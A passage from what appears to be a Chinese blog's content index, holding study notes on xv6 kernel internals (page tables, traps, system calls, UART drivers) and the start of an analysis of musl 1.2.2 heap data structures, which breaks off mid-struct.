切换用户/内核模式的汇编 pipe.c 管道 trap.c 处理陷阱和中断并从中返回 plic.c RISC-V 中断控制器 uart.c 串口控制台设备驱动 printf.c 格式化输出到控制台 virtio_disk.c 磁盘设备驱动 vm.c 管理页表和地址空间 defs.h 模块间接口的定义 进程地址空间每个进程有一个单独的页表，定义了进程的地址空间 有许多因素限制了进程地址空间的最大值 RISC-V 的指针为 64 位 在页表中查找虚拟地址时，硬件仅使用低 39 位 xv6 只使用 38 位 #why 因此最大地址位 2^38^ - 1 = 0x3fffffffff，即 MAXVA（在 kernel/risc.h 中定义）、 在地址空间的顶部保留了一页用作 trampoline（跳板、蹦床），一页用作映射进程的 trapframe（陷阱帧），xv6 用这两个页面进入和退出内核 trampoline 包含进入和退出内核的代码 trapframe 映射用于保存和恢复用户进程的状态 进程状态xv6 内核维护每个进程的状态，存放到 proc 结构体中（kernel/proc.h） 最重要的部分是页表、内核栈、运行状态 p-&gt;state 表示进程状态（分配、准备运行、等待IO、正在退出） p-&gt;pagetable 保存页表，还用作存储进程内存的物理页地址的记录 栈空间 每个进程有两个栈：用户栈和内核栈（p-&gt;kstack） 在执行用户指令时，只有用户栈在使用，内核栈为空 当进入内核模式（系统调用或中断），内核代码会在内核栈上执行，用户栈不变 内核栈是独立的，即使进程破坏了用户栈，内核也可以执行 启动 xv6，第一个进程和系统调用的代码 RISC-V 开机时，会自行初始化，运行存储在 ROM 中的引导加载程序 引导加载程序将 xv6 内核加载到内存 0x80000000 中，因为 0 ~ 0x80000000 之间包含 IO 设备（RISC-V 在分页硬件禁用和虚拟地址直接映射到物理地址条件下开始） 在机器模式下，从 _entry 开始执行 xv6 _entry 的指令设置一个栈，以便 xv6 运行 C 代码 xv6 在 kernel/start.c 中声明一个初始栈 stack0 的空间 _entry 的代码将栈顶寄存器 sp 加载到 stack0 的顶部 stack0+0x1000 接下来调用 kernel/start.c 中的代码 start 函数 先在机器模式执行配置代码 将 main 的地址写入 mepc 寄存器作为 mret 返回地址 将所有中断和异常委托给内核模式 将 0 写入 satp 页表寄存器，禁用内核模式下的虚拟内存转换 对时钟芯片编程来生成计时器中断 然后通过 mret 指令切换到内核模式，进入 main 函数 mret 常用于在内核模式调用进入机器模式后返回到内核模式 start 会将前一个模式设置为内核模式，以便符合 mret 的条件 main 函数 初始化控制台 初始化物理页分配器 创建内核页表 加载启动页面 初始化进程表 根据内核位置设置代码（设置 ecall 的位置？） 初始化中断控制 PLIC 通过中断请求 PLIC 访问设备 初始化 buffer 缓存 初始化 inode 缓存 初始化文件系统 初始化磁盘 进入 userinit 函数 userinit 函数 创建第一个进程 执行用 RISC-V 编写的小程序，使用第一个系统调用 在 user/initcode.S 中把 SYS_exec 系统调用号传给 a7 寄存器，然后调用 ecall 进入内核 安全模型#todo 真实世界大多数操作系统采用了进程的概念，但是现代操作系统的进程支持多个线程，以允许单个进程利用多个 CPU，潜在地更改了接口（如 Linux 的 clone，fork 的一种变体），来控制线程共享的各个方面 Chapter 3 Page tables#todo 分页硬件#todo 内核地址空间#todo 代码：创建一个地址空间大多数处理地址空间和页表的代码在 kernel/vm.c 中 数据结构 pagetable_t，是指向 RISC-V 根页表的指针 typedef uint64 *pagetable_t，它可以是内核或每个进程的页表 中心函数是 walk 和 mappages walk：从页表中查找虚拟地址对应的 PTE mappages：为新映射安装 PTE kvm 开头的函数操作内核页表 uvm 开头的函数操作用户页表 copyin 和 copyout 用于用户与内核之间传输数据 系统启动一开始，main 调用 kvminit 来使用 kvmmake 创建内核页表，在此之前，地址直接映射到物理内存 然后调用 kvminithart 来安装内核页表，将根页表的物理地址写入 satp 寄存器，在此之后 CPU 会使用内核页表转换地址 kvmmake 首先分配一页物理内存来保存根页表 然后调用 kvmmap 来安装内核需要的 PTE 包括内核的指令和数据，最高到 PHYSTOP 的物理内存，设备的内存范围 然后调用 proc_mapstacks 给每个进程分配一个内核栈 它调用 kvmmap 把每个栈映射到 KSTACK 生成的虚拟地址，留出了保护页的空间 kvmmap 调用 mappages 安装 PTE mappages 它对每个虚拟地址先调用 walk 查找对应的 PTE 地址 然后初始化 PTE 保存对应的 PPN 和 权限标志位 walk 它对三级页表进行查询对应的 PTE 若 PTE 无效且设置了 alloc 参数，walk 会分配一个新的页面，并把物理地址放入 PTE 最后返回第三级页表的 PTE 地址 物理内存分配xv6 在内核结尾与 PHSYTOP 之间分配运行时内存，一次分配和释放 4KB xv6 追踪哪些页面是 freed，通过建立一个链表 分配包括从链表中移除，释放包括将 freed 页加入从链表中 代码：物理内存分配器分配器位于 kernel/kalloc.c 中 数据结构是一个 free 链表，每个元素是 struct run，链表由一个 spin lock 保护，锁调用 acquire 和 release，链表和锁被包装在 kmem 结构体中 kernel/kalloc.c1234struct { struct spinlock lock; struct run *freelist;} kmem; xv6 应该通过解析硬件的配置信息来决定有多少物理内存可用 main 函数调用 kinit 来初始化分配器 kinit 初始化 free 链表来保存 free memory 的每一页（kernel 末尾与 PHSYTOP 之间的内存空间） kinit 调用 freerange 来对每一页调用 kfree 向 free 链表添加内存 freerange 使用 PGROUNDUP 确保物理地址对齐（类似向上取整） kfree 会将释放的页面所有值设为 1，然后使用头插法将页面首地址加入 free 链表 进程地址空间每个进程有一个单独的页表| Address | section | Permission || ———— | ———- | ———- || MAXVA | trapline | RX– || | trapframe | R-W- || | unused | || | heap | R-WU || | stack | R-WU || | guard page | || | data | R-WU || Page aligned | unused | || 0 | text | R-XU | trampoline 和 trapframe 映射在高地址，用户模式不可访问 trampoline：在调用 ecall 时会跳转到这里 trapframe：在调用 ecall 时，用户进程的通用寄存器会保存在这里 代码：sbrk系统调用 sbrk 用于进程增减内存大小，由 growproc 实现 growproc 根据 n 的正负，调用 uvmalloc 或 uvmdealloc uvmalloc 调用 kalloc 分配物理内存，然后调用 mappages 向用户页表添加 PTE uvmdealloc 调用 uvmunmap，uvmunmap 使用 walk 找到对应的 PTE 和 kfree 释放物理内存 代码：execexec 使用 namei 打开二进制文件，然后读取 ELF 头 一个 ELF 文件包含一个 ELF 头（struct elfhdr），一系列程序 section 头（struct proghdr），每个 struct proghdr 描述了程序必须加载到内存中的 section，xv6 程序有两个，一个指令，一个是数据 第一步是检查文件是否是 ELF 文件，它从 4 字节的魔术数字开始（0x7F，’E’，’L’，’F’，或者 ELF_MAGIC） 使用 proc_pagetable 分配一个没有用户映射的新页表，用 uvmalloc 给每个 ELF 段分配内存，用 loadseg 加载每个段到内存中，loadseg 使用 walkaddr 找到物理地址写入每个段。使用 readi 读取每个段 分配并初始化一页用户栈，将参数字符串复制到栈顶，在 ustack 记录字符串指针，ustack 前三个是 fake 返回程序计数器，argc 和 argv exec 会在栈页的下面放一个不可访问的页 在准备新的内存镜像时，如果检测到一个错误（如无效的程序段），会跳转到 bad 标签，释放新的镜像，返回 -1。一旦镜像完成，exec 提交新的页表，释放旧的 exec 从文件指定的地址将数据加载到内存中，因此 exec 是有风险的，需要执行很多检查 Real world真正的内存分配器需要处理小分配和大分配 Chapter 4 Traps and system callstrap（陷阱）是让CPU 搁置普通指令的执行，并将控制权转移到处理该事件的特殊代码 系统调用 异常 除以 0 或使用无效的虚拟地址等 中断 设备发出信号，如磁盘完成读写请求时 通常，trap 发生时执行的代码不久后都需要恢复，代码并不需要意识到发生了任何特殊情况 异常处理 trap 强制将控制权转移给内核 内核保存寄存器和其他状态 内核执行处理代码 内核恢复保存的寄存器和状态并从陷阱中返回 原始代码从它停止的地方恢复 Xv6 在内核中处理所有 trap，trap 不会传递给用户代码 隔离要求只有内核可以使用硬件设备，且内核是一种方便的机制，可以在多个进程之间共享设备，不互相干扰，这对于异常也有意义，xv6 通过杀死违规程序来处理用户空间的所有异常 Xv6 处理 trap 有四个阶段 RISC-V CPU 进行硬件操作 一些为内核 C 代码做好准备的汇编指令 决定如何处理 trap 的 C 函数 系统调用或设备驱动程序服务例程 处理 trap 的代码（汇编或 C）被称为 handler handler 的第一步通常用汇编语言编写，称为 vector RISC-V trap 机制寄存器控制寄存器：内核可读写，用于告诉 CPU 怎么处理 trap stvec：保存内核处理 trap 的地址，发生 trap 时会跳转到该地址 Supervisor Trap Vector 用户模式下会指向内核代码的 usertrap 内核模式下会指向内核代码的 kerneltrap sepc：发生 trap 时保存当前的 pc，在使用 sret 指令时，会跳转到 sepc 指向的地址 Supervisor Exception Program Counter sret：从 trap 返回 内核可控制 sepc 让 sret 返回到适当的位置 scause：描述 trap 类型 Supervisor Trap Cause 8 表示系统调用 其他表示错误或者中断 sscatch：辅助作用，防止在保存用户寄存器前将其覆盖 一般用来保存 a0 在 xv6 的 2020 版本用来保存 trapframe 地址 sstatus：以 bitmap 形式保存一些控制信息 Supervisor Status SPP：表示 trap 来自用户模式（0）还是管理者模式（1），并且用来告诉 sret 返回到哪个模式 SIE：表示是否允许设备中断，若为 0 则 RISC-V 会推迟设备中断 在机器模式下有一组类似的控制寄存器，xv6 只在定时器中断的情况下使用 处理 trap 前下面是除 定时器中断 外的 trap 将 sstatus 的 SIE 位 置零 如果是设备中断，不会继续下面的操作 将 pc 复制给 sepc 保存当前模式到 sstatus 的 SSP 设置 scause 表示 trap 原因 设置为管理者模式 将 stvec 复制给 pc 开始执行新的 pc 指向的指令 注意：此时没有转换为内核页表，没有转换为内核栈，也没有保存除 pc 外的任何寄存器，这些需要由内核来实现 原因：这样能提供给内核更好的灵活性，例如在内核中发生 trap 并不需要转换页表，可以提高处理 trap 的性能 相关的汇编指令 ecall environment call 系统调用，一种 trap sret Supervisor Return 将模式从管理者模式更改为指定的模式（sstatus 的 SPP 位） 将 sepc 寄存器复制给 pc 寄存器 启用设备中断（将 sstatus 的 SIE 位设为 1） csrw 写入控制寄存器 csrw sscratch, a0 csrr 读取控制寄存器 csrr t0, sscratch 用户 trap来自用户空间的 trap 的处理流程 uservec（kernel/trampoline.S） usertrap（kernel/trap.c） usertrapret（kernel/trap.c） userret（kernel/trapline.S） trampoline由于RISC-V 硬件在发生 trap 时不会转换页表，这意味着 stvec 保存的地址（处理 trap 的地址）必须在用户页表中存在有效映射，并且在转换成内核页表后，必须在内核页表中也存在有效映射 Xv6 使用了一个 trampoline 页表来解决上面的限制条件 trampoline 页面包含 stvec 指向的 uservec 程序和用于返回到用户代码的 userret 程序 trampoline 在内核每个进程的页表中都映射到了 TRAMPOLINE（0x3ffffff000）地址上，位于虚拟地址顶部，它只允许管理者模式执行 trapframe通用寄存器内容会保存到一个 trapframe 结构体，它通常在用户页表中映射到与 trampoline 相邻的位置（0x3fffffe000），且也只允许管理者模式访问 它的物理地址保存在 proc 结构体的 trapframe 成员变量中，以便内核能通过内核页表直接访问它 kernel/proc.h12345678struct trapframe { /* 0 */ uint64 kernel_satp; // kernel page table /* 8 */ uint64 kernel_sp; // top of process's kernel stack /* 16 */ uint64 kernel_trap; // usertrap() /* 24 */ uint64 epc; // saved user program counter /* 32 */ uint64 kernel_hartid; // saved kernel tp ...}; kernel_satp 保存 kernel 页表地址 kernel_sp 保存进程的内核栈顶地址 kernel_trap 保存内核代码中的 usertrap 位置 epc 保存用户的 pc 在 usertrap() 中会将 sepc 寄存器内容保存到这里 因为可能会跳转到另一个用户进程去执行，sepc 寄存器可能会被更改 kernel_hartid CPU 核心 id，表示该进程在哪个 CPU 核心运行，从 0 开始 剩下的是通用寄存器 uservecuservec 代码位于 kernel/trampoline.S 中 它的作用是保存用户代码的通用寄存器，切换内核栈、内核页表等，跳转到内核中处理 trap 的位置 usertrap（kernel/proc.c） usertrapusertrap 代码位于 kernel/trap.c 中 它的作用是确定 trap 的原因，处理它并返回 首先将 stvec 更改为 kernelvec（kernel/kenelvec.S），这样在内核中发生 trap 时，会进入 kerneltrap 进行处理，而不会进入 usertrap 将 sepc 保存到 trapframe 中，因为 trap 有可能时计时器中断，转换到另一个进程去执行，会将 sepc 覆盖 根据 trap 种类 系统调用 p-&gt;trapframe-&gt;epc +=4 这样在回到用户进程时，会执行下一条指令，而不是再执行 ecall 启用设备中断 调用 syscall 来执行对应的系统调用 设备中断 调用 devintr 处理 异常 杀死出错的进程 检查进程是否被杀死，若杀死则调用 exit 退出 检查是否是计时器中断，若是则调用 yield 放弃 CPU usertrapretusertrapret 代码位于 kernel/trap.c 中 它的作用是设置 trapframe 和控制寄存器 将 stvec 更改为 uservec（kernel/trampoline.S） 设置 trapframe 中 uservec 需要使用的字段 设置 sstatus 设置 sepc 为之前保存的 pc 将用户页表放入 a0 传递给 userret userretuserret 代码位于 kernel/trampoline.S 中 它的作用是切换为用户页表，从 trapframe 中恢复通用寄存器，调用 sret 跳转 sepc 指向的地址，返回到用户模式 代码：调用系统调用user/initcode.S 将 exec 的参数放在 a0 和 a1 寄存器中，把系统调用号放在 a7 中 ecall 指令进入内核，执行 uservec、usertrap 和 syscall 执行 syscall 在 trapframe 中检索 a7 保存的系统调用号，并用它索引到 syscall 中 当 syscall 返回时，将返回值记录到 p-&gt;trapframe-&gt;a0 中 然后用户空间的 exec 函数会将该值返回 系统调用号无效，会打印错误然后返回 -1 代码：系统调用参数根据 RISC-V C 调用约定，系统调用参数存放在寄存器中 内核陷阱代码将寄存器的值保存到当前进程的 trapframe 中，这样内核可以找到它们 内核函数 argint，argaddr，argfd 从 trapframe 中检索系统调用参数作为整数、指针或文件描述符，它们都调用 argraw 从用户寄存器中检索 指针作为参数有两个挑战 用户程序可能是错误或恶意的，传递一个无效的指针或欺骗内核用来访问内核内存的指针 xv6 内核页表映射与用户页表映射并不相同，不能用普通指令从提供的地址加载或存储数据 内核实现了安全的传输数据的函数 文件系统调用如 exec 用 fetchstr（kernel/syscall.c）从用户空间检索字符串文件名参数 fetchstr 调用 copyinstr（kernel/vm.c）来完成 copyinstr 从用户页表的虚拟地址 p-&gt;pagetable-&gt;srcva 复制 max 字节到 dst 中 因为 pagetable 不是当前的页表，copyinstr 使用 walkaddr（它会调用 walk） 在 pagetable 中查找 srcva，从而产生物理地址 pa0 内核将每个物理内存地址映射到对应的内核虚拟地址，因此 copyinstr 能直接从 pa0 复制字符串字节到 dst walkaddr（kernel/vm.c）会检查用户提供的虚拟地址是否是进程地址空间的一部分，因此程序不能欺骗内核来读取其他内存 类似的功能 copyout 从内核读取数据到用户提供的地址 内核 trapCPU 在执行内核时，stvec 会指向 kernelvec（kernel/kernelvec.S） 如果发生 trap 会跳转到 kernelvec 来处理 trap kernelvec 将通用寄存器保存在中断的内核线程的栈中，trap 有可能导致切换线程，这样不会导致混乱 kernelvec 保存完寄存器后调用 kerneltrap（kernel/trap.c） kerneltrap 会保存控制寄存器并处理两种 trap 设备中断 使用 devintr 检查设备中断 如果是计时器中断，且进程的内核线程正在运行，kerneltrep 会调用 yield 让其他线程有机会运行 异常 内核会调用 panic 然后停止运行 当 kerneltrap 任务完成后，它需要返回到 trap 中断的代码，会恢复保存的控制寄存器，然后返回到 kernelvec kernelvec 恢复保存的通用寄存器，然后执行 sret，返回中断的内核代码 在内核开始执行时有一段时间 stvec 仍然指向 uservec，这段时间内不允许发生设备中断 RISC-V 会在发生 trap 时关闭设备中断，让内核有时间设置 stvec 为 kernelvec 页面错误异常CPU 会发出页面错误异常，当： 虚拟地址在页表中没有映射 PTE 的 PTE_V 标志位为 0 PTE 的权限位阻止正在尝试的操作 RISC-V 区分三种页面错误： load page faults store page faults instruction page faults PC 寄存器的地址指向的指令无法翻译 xv6 的异常处理很单一：如果在用户空间发生异常，内核会杀死出错的进程，如果在内核中发生异常，内核会发生 panic 真实的操作系统会做很多有趣的处理 COW fork Lazy allocation Demand Paging Paging to disk Extending stacks Memory-mapped files COW fork许多内核使用页面错误来实现 COW，加快 fork，它不需要复制内存，特别是在 fork 后 exec 时很高效 在 xv6 中，fork 会让子进程的初始内存与父进程的相同，它调用 uvmcopy 给子进程分配物理空间并复制父进程的内存给它 如果父子进程共享父进程的物理内存会更加高效 COW fork 的简单计划 父子进程一开始共享所有的物理页，且设为只读 当某个进程要写入内存时，CPU 抛出页面错误异常 内核的 trap 处理程序分配一个新的物理页面，并将原页面的内容复制过去 将出错进程的页表中相关 PTE 指向副本，允许读写，然后重新执行指令 COW 需要一个记录，来决定物理页面何时释放，它可能有多个进程在使用；当发生 store 页面错误时，如果该物理页面只有出错进程指向它，不需要再复制，直接使用 Lazy allocation用户程序调用 sbrk 申请更多内存时，内核先增加它的 size，但不申请物理内存，不创建映射 当用户程序访问新地址时，会发生页面错误，内核再申请一页物理内存并在页表添加映射 kalloc 初始化页面 页面映射 更新页表 重新执行指令 如果用户程序申请了很大内存，但是不去使用，Lazy allocation 会提高效率 lazy allocation 可以让空间成本随时间分摊，但是会导致页面错误的额外开销 内核可以通过分配一批连续页面，对页面错误的 trap 处理程序进行特殊化来减小开销 Demand paging在 exec 中，xv6 会将程序的所有 text 和 data 直接加载到内存中，由于程序可能会很大，从磁盘中读取开销昂贵 现代内核为用户地址空间创建页表，但是 PTE 标记为无效 当出现页面错误时，内核将页面的内容从磁盘中读取，添加映射 Paging to disk一个进程可能需要的内存多于计算机的 RAM，操作系统可能会实现 paging to disk 内核会将用户页面的一部分放在内存中，其余的页面保存到磁盘中的 paging area 区域，并将对应的 PTE 标记为无效 当进程尝试访问磁盘上的页面，会发生页面错误，内核会将该页面从硬盘中读取出来 如果没有多余的内存 内核先将一个页面驱逐，保存到磁盘中，将对应的 PTE 标记为无效，但是驱逐的花销是昂贵的 真实世界如果将内核内存映射到每个进程的用户页表中，可以消除对页表切换的需求 生产环境的操作系统实现了 COW、Lazy allocation、Demand paging、Paging to disk、Memory-mapped files 等等 xv6 没有这样做，如果用完内存， Chapter 5 Interrupts and device drivers 驱动程序（driver） 操作系统中管理特定设备的代码它配置硬件，告诉设备执行操作，处理产生的中断，与可能正在等待来自设备 I/O 的进程进行交互 driver 代码可能很复杂，因为驱动程序与它管理的设备要同时执行 driver 必须了解设备的硬件接口，接口可能很复杂且缺乏文档记录 后续驱动程序用 driver 表示（别问，问就是 driver 在一堆中文里更清晰） 中断（Interrupt） 设备需要操作系统特别关注，它可以进行配置，产生中断（trap 的一种） 当设备发起中断，内核 trap 处理代码能识别出设备中断并调用驱动程序的中断处理程序 在 xv6 中，中断处理的分配在 devintr 函数中 许多设备 driver 在两个上下文中执行代码 在进程的内核线程中执行前半部分 前半部分由需要执行 I/O 的系统调用（如 read 和 write）来调用 此代码可能请求硬件启动操作（如请求硬盘读取块），然后等待操作完成 最后设备完成操作，发起中断 在中断时执行后半部分 driver 的中断处理程序作为后半部分 它找到设备完成的操作，在适当的情况唤醒正在等待的进程 告诉硬件开始处理下一个操作 代码：控制台输入控制台连接到 RISC-V控制台 driver 位于 kernel/console.c，可作为驱动程序结构的一个简单说明 xv6 的控制台 driver 交互的 UART 硬件是 QEMU 仿真的 16550 芯片，在真实的计算机，一个 16550 芯片管理 RS232 串行链路，连接着一个中断或其他计算机。当运行 QEMU 时，它连接着键盘和显示器 控制台 driver 一次累积一行的输入，处理特殊的输入字符，如退格 backspace 和 control-u 当用户在 QEMU 中向 xv6 输入时，击键通过 QEMU 模拟的 UART 硬件传递给 xv6 一些物理地址由 RISC-V 硬件连接到 UART 设备 从这些物理地址读写是与设备硬件交互而不是内存 UART 的内存映射地址从 0x10000000 （或 UART0 kenrel/memlayout.h）开始 控制寄存器UART 硬件在软件层面为一组内存映射的控制寄存器（这里的寄存器并不是 CPU 寄存器，而且位于 UART 硬件中的寄存器） UART 控制寄存器宽度为 1 Byte，它们在 UART0 的偏移在 kernel/uart.c 中定义 LSR line status register 比特位表示输入的字符是否在等待软件读取 RHR receive holding register 保存等待读取的字符 每次一个字符被读取，UART 硬件将它从一个 FIFO 的结构中删除 当 FIFO 结构为空时将 LSR 的 ready 位清零 THR transimit holding register 保存等待传输的字符 UART 传输硬件很大程度上独立于接收硬件，如果软件向 THR 写 1 Byte，UART 就传输该字节 xv6 的控制台输入xv6 的 main 调用 consoleinit 来初始化 UART 硬件，配置 UART 让它每接收到 1 Byte 输入就生成一个 receive 中断，每完成 1 Byte 的输出就生成一个 transmit complete 中断 用户进程，如 shell，通过 user/init.c 打开的文件描述符，使用 read 系统调用从控制台获取输入行 read 系统调用通过内核的 consoleread 完成操作 consoleread 等待输入（通过中断），然后将字符放入 cons.buf 作为缓冲，把输入复制到用户空间，直到一整行输入到达，返回到用户进程 如果用户还没有输入一整行，任何需要读取的进程都在 sleep 调用中等待 当用户输入一个字符 UART 硬件请求 RISC-V 发起中断，激活 xv6 的 trap 处理程序 trap 处理程序会调用 devintr，从 scause 寄存器查找中断来自哪个外部设备，然后告诉 PLIC 硬件单元哪个设备发出中断，如果来自 UART，devintr 会调用 uartintr uartintr 读取来自 UART 硬件的等待输入的字符（RHR），将它们传给 consoleintr consoleintr 会将字符积累在 cons.buf，但对 backspace 和一些其他字符特殊处理 当一行新的字符到达（读取到 ‘\\n’）时，consoleintr 会唤醒一个正在等着等待的 consoleread 代码：控制台输出设备 driver 维护一个输入缓冲区 uart_tx_buf，因此需要输出的进程不需要等待 UART 完成发送，除非缓冲区已满 write 系统调用使用连接着控制台的文件描述符，最终会到达 uartputc uartputc 将每个字符加入缓冲区，调用 uartstart 开始设备传输并返回 UART 每完成一个字节的发送，就会发起中断，uartintr 调用 uartstart 检查设备是否已经完成发送，然后将下一个缓冲的输出字符传给设备 如果一个进程将多个字节写入控制台，第一个字节会由 uartputc 调用的 uartstart 来发送，剩下的字节由 uartintr 调用的 uartstart 来发送 需要注意的是，这里通过缓冲和中断将设备活动和进程活动进行解耦 控制台 driver 可以处理输入，即使没有进程等待读取，一个后来的读取可以看到输入；进程可以不等待设备发送输出 解耦通过允许进程与设备 I/O 同时执行来提高性能，当设备速度慢（如 UART）或需要即时响应（如回应键入的字符）时尤其重要 这也被称为 I/O 并行 驱动程序中的并发你可能注意到在 consoleread 和 consoleintr 中调用 acquire 这个调用申请一个🔒，保护控制台 driver 的数据结构免受并发访问影响 三个并发危险，可能会导致竞争或死锁 两个在不同 CPU 核的进程同时调用 consoleread 当 CPU 正在执行 consoleread 时，硬件可能请求该 CPU 发送控制台中断 当 CPU 正在执行 consoleread 时，硬件可能在另一个 CPU 中发送控制台中断 drivers 的并发另一个需要小心的地方：一个进程可能等待设备输入，当另一个进程在运行时，输入的中断信号可能到达 中断处理程序不会考虑中断的进程和代码，例如一个中断处理程序无法安全地使用当前进程的页表调用 copyout，它只会做很少量的工作（如，将输入数据复制到缓冲区），并唤醒前半部分代码完成其余工作 定时器中断Xv6 使用定时器中断维持时钟，使其能在进程之间切换进行调度 usertrap 和 kerneltrap 中的 yield 调用也会导致这类切换 定时器中断来自 RISC-V 中每个 CPU 的时钟硬件，xv6 对这个时钟硬件编程，以定期中断每个 CPU RISC-V 要求计时器中断要由机器模式接管，而不是管理者模式 RISC-V 机器模式不用分页执行代码，使用一组独立的控制寄存器，因此在机器模式执行普通的 xv6 内核代码时是不实际的 因此 xv6 将定时器中断独立于之前使用的 trap 机制进行处理 机器模式执行的代码在 kernel/start.c 中，在执行 main 之前，设置定时器中断的接收 对 CLINT（core-local interruptor）硬件进行编程，以在一定延迟后生成中断 设立一个类似 trapframe 的临时区域，帮助定时器中断处理程序保存寄存器和 CLINT 寄存器的地址 最后 start 将 mtvec 设置为 timervec（在 kernel/kernelvec.S 中），启用定时器中断 真实世界xv6 允许在执行内核和用户程序时启用设备和定时器中断 定时器中断强制线程切换，即使是在内核态运行，因此内核代码需要注意它可能被挂起，并在不同的 CPU 上恢复 如果内核线程有时花费大量时间计算而不返回用户空间，在内核线程之间公平地对 CPU 进行时间切片是有效的 如果只在执行用户代码时发生设备和定时器中断，会让内核更简单 在一台计算机上支持所有设备是一项艰巨的工作，因为有许多设备，有许多功能，设备和 driver 之间的协议可能很复杂且缺乏文档。在许多操作系统中，driver 比内核核心代码占用更多 UART driver 通过读取 UART 控制寄存器一次检索 1 Byte 的数据，称为 programmed I/O，因为软件正在驱动数据移动 DMA 编程 I/O 很简单，但是速度太慢，无法在高数据速率下使用 xv6 的 UART driver 先将传入的数据复制到内核的缓冲区，再复制到用户空间，在低数据速率时有效，但如果设备产生或使用数据很快，两次复制会严重降低性能 因此有直接存储器访问（DMA）技术 DMA 硬件设备直接将传入的数据写入 RAM，并从 RAM 读取传出的数据 高速移动大量数据的设备（现代磁盘和网络设备）通常使用直接存储器访问（DMA） 一些操作系统常使用 DMA 直接将数据在用户空间的缓冲区和设备硬件之间移动 DMA 设备 driver 在 RAM 中准备数据，对一个控制寄存器进行一次写入告诉设备去处理准备好的数据 中断优化当一个设备在不可预测的时间需要关注时，中断是有意义的，但是中断有很高的 CPU 开销 高速设备（如网络和磁盘控制器）使用一些技巧减少中断的需求 对整批传入或传出的请求发起一个中断 轮询：完全禁用中断，定期检查设备是否需要关注 如果设备执行操作非常快，轮询效率较高，但是如果设备大部分时间处于空闲状态，则会浪费 CPU 时间 某些驱动程序根据当前设备负载会在轮询和中断之间动态切换 设备使用如第 1 章所述，控制台在应用程序呈现为一个常规文件，应用程序通过 read 和 write 系统调用读取输入，写入输出 应用程序可能想要控制不能作为标准文件系统调用的设备，Unix 操作系统支持 ioctl 系统调用应对这种情况 实时响应计算机的一些使用需要系统在有限的时间内做出响应（严格安全的系统错过 deadline 可能会导致灾难） xv6 不适合严格实时设置，严格实时操作系统往往是与应用程序链接的库，允许进行分析最坏情况下的响应时间 xv6 也不适合软实时应用程序，偶尔错过 deadline 是可以接受的，因为 xv6 调用程序过于简单，并且它在内核代码路径中有一段较长时间中断是禁止的","link":"/2022/10/14/Xv6/"},{"title":"Musl heap 浅析","text":"浅浅分析一下 前言环境：x64 musl-1.2.2 笔者只浅浅分析了 malloc 和 free 的源码，对相关结构没有详细介绍，可配合 xf1les 师傅的文章食用 相关结构chunk实际上源码并没有 chunk 结构体定义，下面是通过 malloc 推测出来 1234567struct chunk { char prev_data[4]; uint8_t idx:5; // group 的第几个 chunk，从 0 开始 uint8_t reserved:3; // chunk 没有用到的空间大小，若 reserved = 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved uint16_t offset; // 相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10 char data[]; // 用户数据}; prev_data 空间复用，前一个 chunk 可以多使用 4 个字节 idx group 的第几个 chunk，从 0 开始 reserved chunk 没有用到的空间大小 若 reserved == 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved offset 相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10 由于内存对齐，每个 chunk 可以使用下一个 chunk 的 4 字节空间 （每个 group 的第一个 chunk 前面有 0x10 个字节 = group + chunk_header） inuse_chunkavail_mask 和 freed_mask 对应的位置都为 0 unuse_chunk avail_chunk 内容一般为空 avail_mask 上 idx 对应的位置为 1 freed_chunk idx 和 reserved 置为 0xff，offset 置零 freed_mask 上 idx 对应的位置为 1 group./src/malloc/mallocng/meta.h1234567#define UNIT 16struct group { struct meta *meta; // 对应的 meta 地址 unsigned char active_idx:5; // last_chunk_idx char pad[UNIT - sizeof(struct meta *) - 1]; // alien unsigned char storage[]; // chunks}; 由 meta 管理，位于可执行文件的数据段 meta 对应的 meta 地址 active_idx 可用的 chunk 的最大 idx pad 填充位，用于对齐 storage 存储数据，chunks meta./src/malloc/mallocng/meta.h123456789struct meta { struct meta *prev, *next; // 同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接 struct group *mem; // 指向对应的 group 地址 volatile int avail_mask, freed_mask; // 以位图方式表示 group 中 chunk 状态 uintptr_t last_idx:5; // group 中 chunk 数量 uintptr_t freeable:1; // meta 是否可以被回收，1 表示可以 uintptr_t sizeclass:6; // 作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte） uintptr_t maplen:8*sizeof(uintptr_t)-12;}; prev，next 同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接 mem 指向对应的 group 地址 avail_mask，freed_mask 以位图方式表示 group 中 chunk 状态，因此一个 group 最多能有 32 个 chunk 0 表示 inuse，1 表示 avail 或 freed chunk 分为 inuse_chunk、avail_chunk、freed_chunk 三个状态 last_idx group 中 chunk 数量 freeable meta 是否可以被回收，1 表示可以 sizeclass 作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte） 123456789101112131415// ./src/malloc/mallocng/malloc.cconst uint16_t size_classes[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 18, 20, 25, 31, 36, 42, 50, 63, 72, 84, 102, 127, 146, 170, 204, 255, 292, 340, 409, 511, 584, 682, 818, 1023, 1169, 1364, 1637, 2047, 2340, 2730, 3276, 4095, 4680, 5460, 6552, 8191,}; maplen 若 group 是 mmap 分配的空间，为对应的长度，其他情况为 0 avail_meta在 meta_area 中按顺序取出，avail_meta = {0} freed_meta FIFO，malloc_context 中 freed_meta_head 指向第一个 freed_meta meta-&gt;mem-&gt;meta = 0 freed_meta = {0} meta_area./src/malloc/mallocng/meta.h123456struct meta_area { uint64_t check; // 与 malloc_context 中的 secret 相等，防止伪造 meta struct meta_area *next; // 下一个 meta_area 的地址 int nslots; // meta 槽的数量 struct meta slots[]; // metas}; 以页为单位分配，是多个 meta 的集合，因此 meta_area_addr = meta_addr &amp; 0xfffffffffffff000 check 与 malloc_context 中的 secret 相等，防止伪造 meta next 下一个 meta_area 的地址 nslots meta 槽的数量 注：在 musl 中 slot 可能指 meta 也可能指 chunk slots 存放多个 meta 结构体，metas malloc_context./src/malloc/mallocng/meta.h123456789101112131415161718struct malloc_context { uint64_t secret; // 防止伪造 meta#ifndef PAGESIZE size_t pagesize;#endif int init_done; // 是否初始化的标记 unsigned mmap_counter; // 记录 mmap 出来的 chunk 的数量 struct meta *free_meta_head; // 指向 freed_meta 头 struct meta *avail_meta; // 指向 area_areas 中可分配 meta 空间 size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift; struct meta_area 